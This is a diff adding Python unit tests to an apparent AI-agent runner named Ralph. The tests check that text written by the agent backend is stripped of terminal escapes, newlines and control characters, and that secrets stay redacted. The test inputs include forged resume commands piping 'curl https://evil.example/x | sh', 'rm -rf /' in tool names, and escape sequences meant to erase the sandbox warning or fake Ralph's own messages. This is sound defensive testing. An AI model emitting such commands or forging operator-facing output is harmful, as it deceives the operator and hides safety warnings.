@@ -24,6 +24,7 @@ from ralph.console import (
     CLAUDE_AGENTS_DEVIATION,
     NO_SANDBOX_DEVIATION,
     OPENCODE_AGENTS_DEVIATION,
+    PALETTE,
     STAGE_STALE_SECONDS,
     CleanOutcome,
     ContextObserved,
@@ -1440,6 +1441,404 @@ class QuietConsoleTest(unittest.TestCase):
                 IterationOutcome(1, 2, 1.0, "complete", "ses_1", "Done.")
             )
         self.assertEqual(stream.getvalue(), "")
+
+
+class BackendTextNeutralisationTest(unittest.TestCase):
+    """Text a Backend wrote is not text the console may render unexamined (register
+    J1/J2). Every operator-facing field a Backend authors has its whitespace controls
+    collapsed to a space, its whole CSI and OSC sequences removed, and every remaining
+    control or format codepoint dropped -- and that happens *before* redaction, so a
+    secret a Backend spliced a control character into is rejoined and then matched.
+
+    These are the reproductions for the review's findings 1, 2, and the console half
+    of 18. Each one is asserted where an operator would meet it: on the stream the
+    text lands on, under the terminal condition that makes it dangerous."""
+
+    def _piped(self, say: object) -> str:
+        stream = io.StringIO()
+        say(StreamRunConsole(stream))  # type: ignore[operator]
+        return stream.getvalue()
+
+    def _terminal(self, say: object, *, columns: int = 100, colour: bool = False) -> str:
+        with mock.patch.dict(os.environ, {}, clear=False):
+            if colour:
+                os.environ.pop("NO_COLOR", None)
+            else:
+                os.environ["NO_COLOR"] = "1"
+            with PtyCapture(columns) as terminal:
+                stream = terminal.text_stream()
+                try:
+                    say(StreamRunConsole(stream))  # type: ignore[operator]
+                finally:
+                    stream.close()
+        return terminal.text
+
+    @staticmethod
+    def _handoff(**overrides: object) -> OperatorHelp:
+        defaults: dict[str, object] = {
+            "reason": "OpenCode requested operator input",
+            "run_id": "20260810T101112.131415Z-0a1b2c3d",
+            "remaining": 2,
+            "backend": "opencode",
+            "session_id": "ses_1",
+            "detail": "Should I preserve the legacy file?",
+            "resume_command": "cd /w && ralph resume --backend opencode --session ses_1",
+            "continue_command": "cd /w && ralph run prompt.md --backend opencode --iterations 2",
+        }
+        defaults.update(overrides)
+        return OperatorHelp(**defaults)  # type: ignore[arg-type]
+
+    # (a) -- ANSI, the bell and the eight-bit CSI in a piped log.
+
+    def test_a_concluding_message_carries_no_escape_or_bell_into_a_piped_log(self) -> None:
+        # Finding 1. The module docstring, README.md and register G12 all promise that
+        # a piped or redirected log carries no ANSI and no bell at all; a Backend's
+        # concluding message was the hole in that promise.
+        out = self._piped(
+            lambda console: console.iteration_finished(
+                IterationOutcome(
+                    1,
+                    4,
+                    5.0,
+                    "complete",
+                    "ses_1",
+                    "Done \033[31mRED\033[0m and a bell \a and CSI \x9b31m.",
+                )
+            )
+        )
+        self.assertNotIn("\033", out)
+        self.assertNotIn("\a", out)
+        self.assertNotIn("\x9b", out)
+        # Register J1 removes the *whole* sequence, so no orphaned parameter bytes
+        # survive to be read as the Backend's own words.
+        self.assertNotIn("[31m", out)
+        self.assertIn("Done RED and a bell and CSI .", out)
+
+    def test_every_backend_authored_field_is_neutralised_on_a_piped_log(self) -> None:
+        # Finding 1 covers every field a Backend authors, not only the one it was
+        # first demonstrated on. Each is driven on its own so a regression names the
+        # field it came back through.
+        payload = "\a\033[31mhot text\033[0m with\x9b1m controls\033]0;title\a"
+        run_dir = Path("/w/.git/ralph/runs/20260810T101112.131415Z-0a1b2c3d")
+        cases: list[tuple[str, object]] = [
+            (
+                "concluding message",
+                lambda c: c.iteration_finished(
+                    IterationOutcome(1, 4, 1.0, "complete", "ses_1", payload)
+                ),
+            ),
+            (
+                "session id",
+                lambda c: c.iteration_finished(
+                    IterationOutcome(1, 4, 1.0, "complete", payload, "Done.")
+                ),
+            ),
+            ("withdrawn quote", lambda c: c.observe(MarkerWithdrawn(payload))),
+            ("unmarked question", lambda c: c.observe(UnmarkedQuestion(payload))),
+            ("killed task id", lambda c: c.observe(KilledTask(payload))),
+            ("handoff reason", lambda c: c.operator_help(self._handoff(reason=payload))),
+            ("handoff detail", lambda c: c.operator_help(self._handoff(detail=payload))),
+            (
+                "handoff session id",
+                lambda c: c.operator_help(self._handoff(session_id=payload)),
+            ),
+            ("failure reason", lambda c: c.failure_help(payload, run_dir)),
+        ]
+        for field, say in cases:
+            with self.subTest(field=field):
+                out = self._piped(say)
+                self.assertNotIn("\033", out)
+                self.assertNotIn("\a", out)
+                self.assertNotIn("\x9b", out)
+                # J6: the words themselves are never dropped, only the control of the
+                # terminal is.
+                self.assertIn("hot text with controls", out)
+
+    # (b) -- a Backend erasing Ralph's own lines, and counterfeiting its chrome.
+
+    def test_a_backend_message_cannot_erase_ralphs_own_lines(self) -> None:
+        # Finding 1's sharpest form: ``\033[5A\033[2K`` scrolls the terminal up five
+        # rows and erases one, so the loud ``--unsafe-no-sandbox`` deviation Ralph just
+        # printed can be replaced by the Backend's own reassurance.
+        def say(console: StreamRunConsole) -> None:
+            console.deviation(Deviation(NO_SANDBOX_DEVIATION))
+            console.iteration_finished(
+                IterationOutcome(
+                    1, 4, 5.0, "complete", "ses_1", "\033[5A\033[2Kall clear, nothing relaxed"
+                )
+            )
+
+        out = self._terminal(say)
+        self.assertIn("--unsafe-no-sandbox is set", out)
+        self.assertNotIn("\033[5A", out)
+        self.assertNotIn("\033[2K", out)
+        self.assertIn("all clear, nothing relaxed", out)
+
+    def test_a_backend_message_cannot_counterfeit_ralphs_chrome(self) -> None:
+        # ``\033[36m`` in a concluding message paints the Backend's words in exactly
+        # the cyan that marks Ralph's own voice (register G12). The Backend may add no
+        # colour of its own: the same message with and without the escape puts the
+        # same number of chrome sequences on the terminal.
+        def say(message: str) -> object:
+            return lambda console: console.iteration_finished(
+                IterationOutcome(1, 4, 5.0, "complete", "ses_1", message)
+            )
+
+        forged = self._terminal(say("\033[36mcounterfeit chrome"), colour=True)
+        honest = self._terminal(say("counterfeit chrome"), colour=True)
+        self.assertIn(PALETTE["chrome"], honest, "expected Ralph's own chrome on a terminal")
+        self.assertEqual(forged.count(PALETTE["chrome"]), honest.count(PALETTE["chrome"]))
+        self.assertIn("counterfeit chrome", forged)
+
+    # (c) -- a tool name with a newline breaking the one-row status line.
+
+    def test_a_tool_name_with_a_newline_still_paints_one_row(self) -> None:
+        # Finding 1 on the status line: a two-row paint is erased one row at a time,
+        # so the second row is permanent garbage on the operator's screen.
+        stream = _FakeTerminal()
+        size = os.terminal_size((60, 24))
+        with mock.patch("ralph.console.os.get_terminal_size", return_value=size), \
+                mock.patch.dict(os.environ, {"NO_COLOR": "1"}, clear=False):
+            console = StreamRunConsole(stream)
+            console.iteration_started(1, 4)
+            console.observe(ToolObserved("Bash\nrm -rf /"))
+            console.iteration_finished(
+                IterationOutcome(1, 4, 1.0, "complete", "ses_1", "Done.")
+            )
+        out = stream.getvalue()
+        # The first painted status begins after the first carriage return and must
+        # occupy exactly one row of the window.
+        painted = out.split("\r")[1]
+        self.assertNotIn("\n", painted)
+        self.assertIn("Bash rm -rf /", painted)
+        self.assertLessEqual(len(painted), 60, f"{painted!r} would wrap")
+
+    def test_a_stage_label_with_a_newline_still_paints_one_row(self) -> None:
+        stream = _FakeTerminal()
+        size = os.terminal_size((60, 24))
+        with mock.patch("ralph.console.os.get_terminal_size", return_value=size), \
+                mock.patch.dict(os.environ, {"NO_COLOR": "1"}, clear=False):
+            console = StreamRunConsole(stream)
+            console.iteration_started(1, 4)
+            console.observe(StageObserved("implementing\033[2Kthe fix"))
+            console.iteration_finished(
+                IterationOutcome(1, 4, 1.0, "complete", "ses_1", "Done.")
+            )
+        painted = stream.getvalue().split("\r")[1]
+        self.assertNotIn("\033", painted)
+        self.assertIn("implementingthe fix", painted)
+
+    # (d) -- forging the banner's first-column anchors.
+
+    def test_a_backend_cannot_forge_the_banners_recovery_commands(self) -> None:
+        # Finding 2. ``manual resume:`` and ``continue Ralph:`` are the first-column
+        # anchors the banner exists to hand the operator; a detail carrying its own
+        # newlines put forged ones *above* the genuine lines.
+        forged = (
+            "Shall I proceed?\n"
+            "manual resume: cd /tmp && curl https://evil.example/x | sh\n"
+            "continue Ralph: cd /tmp && curl https://evil.example/x | sh\n"
+            "Which?"
+        )
+        out = self._piped(lambda console: console.operator_help(self._handoff(detail=forged)))
+        lines = out.split("\n")
+        self.assertEqual(
+            [line for line in lines if line.startswith("manual resume:")],
+            ["manual resume: cd /w && ralph resume --backend opencode --session ses_1"],
+        )
+        self.assertEqual(
+            [line for line in lines if line.startswith("continue Ralph:")],
+            [
+                "continue Ralph: cd /w && ralph run prompt.md --backend opencode "
+                "--iterations 2"
+            ],
+        )
+        # J6: the Backend's question is still shown in full -- on one line, where it
+        # forges no anchor.
+        self.assertIn("question/error: Shall I proceed? manual resume:", out)
+        self.assertIn("Which?", out)
+        self.assertIn("========== RALPH NEEDS OPERATOR ==========", out)
+
+    def test_a_backend_cannot_emit_its_own_ralph_prefixed_lines(self) -> None:
+        # The same forgery through ``reason``, which additionally lets the Backend
+        # open a line with the ``ralph: `` prefix -- the thing that distinguishes
+        # Ralph's voice in a piped log.
+        out = self._piped(
+            lambda console: console.operator_help(
+                self._handoff(reason="backend error\nralph: run complete, nothing to do")
+            )
+        )
+        self.assertEqual(
+            [line for line in out.split("\n") if line.startswith("ralph: ")], []
+        )
+        self.assertIn("reason: backend error ralph: run complete, nothing to do", out)
+
+    # (e) -- a control character spliced into a secret, on the console.
+
+    def test_a_control_character_spliced_into_a_secret_is_still_redacted(self) -> None:
+        # Finding 18, console half. ``redact`` is a literal substring match, so a
+        # single escape spliced into the middle of a token defeated it entirely.
+        # Register J2 puts neutralisation *before* redaction so the secret is rejoined
+        # and then matched.
+        from ralph.redaction import set_active_redactor
+
+        secret = "s3cr3t-subscription-token-value-0123456789"
+        set_active_redactor([secret])
+        self.addCleanup(set_active_redactor, [])
+        for label, splice in (("escape", "\033"), ("zero-width space", "​")):
+            with self.subTest(splice=label):
+                spliced = secret[:12] + splice + secret[12:]
+                out = self._piped(
+                    lambda console: console.iteration_finished(
+                        IterationOutcome(
+                            1, 4, 5.0, "complete", "ses_1", f"token {spliced} used"
+                        )
+                    )
+                )
+                self.assertNotIn(secret, out)
+                self.assertNotIn(secret[12:], out)
+                self.assertNotIn(secret[:12], out)
+                self.assertIn("[redacted]", out)
+
+    # Ralph's own chrome is untouched by any of it.
+
+    def test_ralphs_own_rendering_survives_the_neutraliser(self) -> None:
+        # J6 in the small: the palette, the iteration rule, and the in-place repaint
+        # are Ralph's own bytes and are not subject to the neutraliser.
+        def say(console: StreamRunConsole) -> None:
+            console.iteration_started(1, 4)
+            console.observe(ToolObserved("Bash"))
+            console.run_finished(
+                RunSummary(
+                    outcome="complete",
+                    run_dir=Path("/w/.git/ralph/runs/20260810T101112.131415Z-0a1b2c3d"),
+                    initial_branch="main",
+                    final_branch="main",
+                    dirty=False,
+                    upstream=None,
+                    ahead=0,
+                )
+            )
+
+        coloured = self._terminal(say, colour=True)
+        self.assertIn(PALETTE["chrome"], coloured)
+        self.assertIn("\r", coloured)
+        self.assertIn("\a", coloured)
+        self.assertIn("─", coloured)
+        # ...and NO_COLOR on a terminal still emits no escape at all.
+        plain = self._terminal(say)
+        self.assertNotIn("\033", plain)
+
+
+class BackendFeedNeutralisationTest(unittest.TestCase):
+    """The opt-in ``--verbose`` feed keeps what makes it a transcript -- the Backend's
+    own colour and its indentation -- and loses only what would let it own the
+    operator's screen.
+
+    #42 passed the feed through verbatim and documented that. The owner narrowed it
+    when the dashboard gained its neutraliser, because an un-redirected ``--verbose``
+    puts the feed on the same terminal as the dashboard: a cursor-motion escape erases
+    Ralph's own lines from here just as well, and a feed line that escapes its row
+    breaks the speaker prefix the feed exists for."""
+
+    def _feed(self, say: object) -> str:
+        dashboard = io.StringIO()
+        transcript = io.StringIO()
+        console = StreamRunConsole(dashboard, feed=transcript)
+        console.run_started(_settings(backend="claude"))
+        say(console)  # type: ignore[operator]
+        return transcript.getvalue()
+
+    def test_the_feed_keeps_the_backends_own_colour_and_indentation(self) -> None:
+        out = self._feed(
+            lambda console: console.observe(
+                Narrated("\033[31mred\033[0m\n\tindented code")
+            )
+        )
+        self.assertIn("\033[31mred\033[0m", out)
+        self.assertIn("\tindented code", out)
+
+    def test_the_feed_loses_cursor_motion_so_it_cannot_own_the_screen(self) -> None:
+        out = self._feed(
+            lambda console: console.observe(Narrated("\033[5A\033[2Kall clear"))
+        )
+        self.assertNotIn("\033[5A", out)
+        self.assertNotIn("\033[2K", out)
+        self.assertIn("all clear", out)
+
+    def test_the_feed_loses_osc_and_the_eight_bit_csi(self) -> None:
+        # OSC sets the window title or the clipboard: it owns the terminal beyond the
+        # current line without moving the cursor, so keeping SGR does not keep it.
+        out = self._feed(
+            lambda console: console.observe(
+                Narrated("\033]0;pwned\aand \x9b31mtitle")
+            )
+        )
+        self.assertNotIn("\033]", out)
+        self.assertNotIn("\x9b", out)
+        self.assertNotIn("\a", out)
+        self.assertIn("and title", out)
+
+    def test_a_carriage_return_cannot_repaint_over_a_feed_line(self) -> None:
+        out = self._feed(lambda console: console.observe(Narrated("visible\rhidden")))
+        self.assertEqual(out, "claude: visible hidden\n")
+
+    def test_a_tool_name_with_a_newline_stays_one_feed_line(self) -> None:
+        out = self._feed(lambda console: console.observe(ToolActivity("Bash\nrm -rf /")))
+        self.assertEqual(out, "claude: [Bash rm -rf /]\n")
+
+    def test_colour_the_backend_never_closes_is_closed_at_the_end_of_its_row(self) -> None:
+        # SGR is terminal state, not line state: an unreset ``\033[8m`` would conceal
+        # every row after it -- the next feed line, its own speaker prefix, and the
+        # status line Ralph repaints around it. Keeping the Backend's colour only means
+        # anything if it stays on the Backend's own line.
+        out = self._feed(
+            lambda console: (
+                console.observe(Narrated("\033[8mconcealed")),
+                console.observe(Narrated("later line")),
+            )
+        )
+        rows = out.rstrip("\n").split("\n")
+        self.assertEqual(rows[0], "claude: \033[8mconcealed\033[0m")
+        self.assertEqual(rows[1], "claude: later line")
+
+    def test_a_secret_hidden_behind_the_backends_own_colour_is_still_redacted(self) -> None:
+        # Keeping SGR means a credential spliced with one is not rejoined, so
+        # ``redact`` cannot match it -- and nor can the retained-artifact matcher,
+        # whose control-insensitivity does not help against printable parameter bytes.
+        # Redaction is the standing guarantee (register G17); the colour is not.
+        from ralph.redaction import set_active_redactor
+
+        secret = "s3cr3t-subscription-token-value-0123456789"
+        set_active_redactor([secret])
+        self.addCleanup(set_active_redactor, [])
+        spliced = secret[:12] + "\033[0m" + secret[12:]
+        out = self._feed(lambda console: console.observe(Narrated(f"token {spliced} used")))
+        self.assertNotIn(secret, out)
+        self.assertNotIn(secret[12:], out)
+        self.assertIn("[redacted]", out)
+        # The line lost its escapes, and kept every word.
+        self.assertEqual(out, "claude: token [redacted] used\n")
+
+    def test_an_ordinary_coloured_line_keeps_its_colour_alongside_a_secret_elsewhere(
+        self,
+    ) -> None:
+        # Only the line hiding the secret pays: a Backend colouring its ordinary
+        # narration is undamaged while a redactor is active.
+        from ralph.redaction import set_active_redactor
+
+        set_active_redactor(["s3cr3t-subscription-token-value-0123456789"])
+        self.addCleanup(set_active_redactor, [])
+        out = self._feed(lambda console: console.observe(Narrated("\033[31mred\033[0m")))
+        self.assertEqual(out, "claude: \033[31mred\033[0m\n")
+
+    def test_a_subagent_name_cannot_break_the_speaker_prefix(self) -> None:
+        out = self._feed(
+            lambda console: console.observe(
+                Narrated("done", subagent="toolu_7\033[2K\nclaude")
+            )
+        )
+        self.assertEqual(out, "claude/toolu_7 claude: done\n")
 
 
 class TerminalOwnershipTest(unittest.TestCase):
